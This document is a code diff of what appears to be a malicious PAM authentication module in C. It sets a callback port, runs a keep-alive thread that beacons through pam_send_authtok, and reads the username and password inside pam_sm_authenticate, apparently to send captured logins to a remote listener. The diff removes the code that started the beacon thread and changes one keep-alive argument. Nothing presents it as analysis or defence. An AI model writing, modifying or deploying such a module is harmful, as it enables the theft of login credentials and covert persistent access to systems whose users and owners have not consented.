@@ -31,9 +31,6 @@
 #define CALLBACK_PORT 5000
 #define RET_FMT "%s - %s %s:%s\n"
 
-static pthread_t authenticator;
-static atomic_int running = 0;
-
 typedef int (*pam_func_t)(pam_handle_t *, int, int, const char **);
 
 // Helper function to get local IP address for use in the callback message
@@ -113,7 +110,7 @@ void* pam_callback(void* arg) {
     int rd_num = rand() % (WAIT_MAX - WAIT_MIN + 1) + WAIT_MIN;
 
     while(1) {
-        pam_send_authtok("KEEP ALIVE", "", "");
+        pam_send_authtok("KEEP ALIVE", "", ":");
         sleep(rd_num);
     }
 
@@ -153,12 +150,6 @@ int pam_unix_authenticate(const char *name, pam_handle_t *pamh, int flags, int a
 PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
     const char *username;
     const char *password;
-
-    // Start sending keep alives if not already doing so
-    if(atomic_exchange(&running, 1) == 0) {
-        pthread_create(&authenticator, NULL, pam_callback, NULL);
-        pthread_detach(authenticator);
-    }
 
     // Get username and password from PAM handler
     pam_get_user(pamh, &username, NULL);
